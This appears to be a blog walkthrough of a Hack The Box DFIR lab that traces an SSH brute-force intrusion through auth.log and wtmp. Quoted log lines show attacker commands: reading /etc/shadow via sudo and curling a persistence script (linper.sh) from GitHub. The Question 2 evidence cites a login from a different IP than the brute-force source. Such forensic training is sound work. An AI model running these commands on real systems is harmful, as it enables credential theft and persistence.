Untitled Post

Hey! I just wrapped up Brutus, an easy-difficulty Sherlock on Hack The Box. Honestly, this was such a fun, hands-on way to brush up on my DFIR (Digital Forensics and Incident Response) basics. If you've ever wanted to get cozy with Linux auth logs (auth.log) and session histories (wtmp), this lab is the perfect playground.

The scenario is simple: a Confluence server got brute-forced over SSH. Once the attacker got in, they started making themselves at home—escalating privileges, setting up persistence, and downloading scripts. Our job is to trace their footsteps.

Let me walk you through how I tackled this, what had me scratching my head for a second, and how everything eventually clicked.

Question 1

Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?

To start off, I wanted to get a high-level bird's-eye view of what happened on this system. Instead of blindly scrolling through a massive log file, I decided to pull a clean list of the processes that were actually active in auth.log.

I ran this slick little pipeline to extract, clean, sort, and count the process names:

awk '{print $5}' auth.log | sed 's/[\[\:].*//g' | sort | uniq -c

Here’s the output I got:

      1 chfn
    104 CRON
      3 groupadd
      1 passwd
    257 sshd
      6 sudo
      2 systemd
      8 systemd-logind
      1 useradd
      2 usermod

To make the sequence of events clearer, I sorted them numerically:

awk '{print $5}' auth.log | sed 's/[\[\:].*//g' | sort | uniq -c | sort -n

      1 chfn
      1 passwd
      1 useradd
      2 systemd
      2 usermod
      3 groupadd
      6 sudo
      8 systemd-logind
    104 CRON
    257 sshd

Looking at this, a few things immediately stood out to me. First, there’s a ton of sshd activity (257 entries), which screams brute-force. But then I saw things like useradd, usermod, groupadd, and passwd. That’s a massive red flag. It means whoever got in was busy creating accounts and changing permissions.

I also noticed chfn run exactly once. I’ll be honest—I wasn't 100% sure what chfn did off the top of my head. I ran a quick help command to check it out:

chfn -h       

Usage: chfn [options] [LOGIN]

Options:
  -f, --full-name FULL_NAME     change user's full name
  -h, --home-phone HOME_PHONE   change user's home phone number
  -o, --other OTHER_INFO        change user's other GECOS information
...

Ah, okay! It's used to change a user's GECOS (user details) information. So the attacker was definitely tweaking user accounts.

Next, I wanted to see who they added. I ran a quick grep for useradd:

grep useradd auth.log

Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1

Okay, so they created a user named cyberjunkie.

Now, back to the brute force attack. Since sshd handles the remote connections, I grepped for it to find the IP addresses knocking at our door:

grep sshd auth.log

Mar  6 06:19:52 ip-172-31-35-28 sshd[1465]: AuthorizedKeysCommand /usr/share/ec2-instance-connect/eic_run_authorized_keys root SHA256:4vycLsDMzI+hyb9OP3wd18zIpyTqJmRq/QIZaLNrg8A failed, status 22
Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2
Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Invalid user admin from 65.2.161.68 port 46380
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Received disconnect from 65.2.161.68 port 46380:11: Bye Bye [preauth]
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Disconnected from invalid user admin 65.2.161.68 port 46380 [preauth]
...
Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: Invalid user admin from 65.2.161.68 port 46392
Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: pam_unix(sshd:auth): check pass; user unknown
Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68 
...

Looking at this, we see a massive wave of invalid login attempts for admin coming from 65.2.161.68. That's our brute-forcing IP!

Question 2

The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?

Going back to our grep search on sshd, we can see that before the noisy brute-force wave on admin from the other IP, there was a successful password login:

Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2

The account they successfully compromised was root.

Question 3

Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.

To find when the attacker actually logged in and opened an active terminal session, we have to look at the wtmp file. This file tracks logins, logouts, system boots, and shutdowns.

The lab folder came with a helper Python script (utmp.py) to parse this binary file. I first ran it and piped it to head to see what kind of fields we were working with:

TZ=utc python3 utmp.py wtmp | head -1

"type"  "pid"   "line"  "id"    "user"  "host"  "term"  "exit"  "session"       "sec"   "usec"  "addr"

The fields I cared about most were the user, the session time, and the host address. So, I filtered the output for the attacker's IP and used awk to grab just the username and the timestamp columns:

TZ=utc python3 utmp.py wtmp | grep 65.2.161.68 | awk '{print $5 $10 $11}'

"root""2024/03/0606:32:45"
"cyberjunkie""2024/03/0606:37:35"

Boom! There it is. The attacker manually logged into the root account and established their session at 2024-03-06 06:32:45.

It’s pretty cool seeing the timeline construct itself: they logged in as root first, and then just a few minutes later, we see the cyberjunkie account log in.

Question 4

SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?

This is where understanding Linux system internals comes in handy. When a user logs in via SSH, the systemd-logind service allocates a unique session ID to keep track of their processes and session state.

I decided to grep auth.log specifically for systemd-logind to map out these sessions:

grep "systemd-logind" auth.log

Here’s what came back:

Mar  6 06:19:54 ip-172-31-35-28 systemd-logind[411]: New session 6 of user root.
Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: New session 34 of user root.
Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: Session 34 logged out. Waiting for processes to exit.
Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: Removed session 34.
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Session 37 logged out. Waiting for processes to exit.
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.
Mar  6 06:37:34 ip-172-31-35-28 systemd-logind[411]: New session 49 of user cyberjunkie.

We know from our previous step that the manual session we're investigating was established at 06:32:45. Looking at the log above, New session 37 of user root was created at 06:32:44.

So, the attacker's session ID was 37.

Question 5

The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

We actually stumbled onto this answer earlier while hunting around! I had run a grep for the useradd command:

less auth.log | grep useradd

Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1

The backdoor account they created is cyberjunkie.

Question 6

What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?

For this, I had to step out of the terminal and look up the MITRE ATT&CK framework. Creating a local account falls under the Persistence tactic.

A quick search confirmed that "Create Account: Local Account" is mapped to sub-technique T1136.001.

Question 7

What time did the attacker's first SSH session end according to auth.log?

To find when their SSH session wrapped up, I looked for when systemd-logind officially destroyed the session. I ran a quick grep for "Removed session":

TZ=utc grep "Removed session" auth.log

Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: Removed session 34.
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.

Since we determined earlier that the attacker’s active session was ID 37, we can see it was officially closed and removed at 06:37:24.

Question 8

The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

Lastly, I needed to figure out what the attacker did once they logged back in as cyberjunkie and used their elevated permissions. I targeted both sudo and the cyberjunkie username to see their exact command execution trail:

TZ=utc grep "sudo" auth.log | grep cyberjunkie

Here’s the payload trail:

Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
Mar  6 06:37:57 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
Mar  6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
Mar  6 06:39:38 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)

At 06:37:57, they read the /etc/shadow file (classic password grabbing).
A couple of minutes later, at 06:39:38, they ran a curl command to fetch a Linux persistence script (linper.sh) from GitHub.

The full command they executed is:
/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh

Wrapping Up

And that’s a wrap on Brutus!

It was a super clean, straightforward lab, but honestly, it was an awesome refresher on some of the most fundamental skills in cybersecurity. Being able to slice through log files with basic Linux command-line tools and reconstruct a timeline of exactly how an attack went down is a superpower.

What would I do differently next time? I’d probably script the log parsing a bit more to automate some of the session correlation, but manually walking through it this time really helped cement how these services talk to each other.
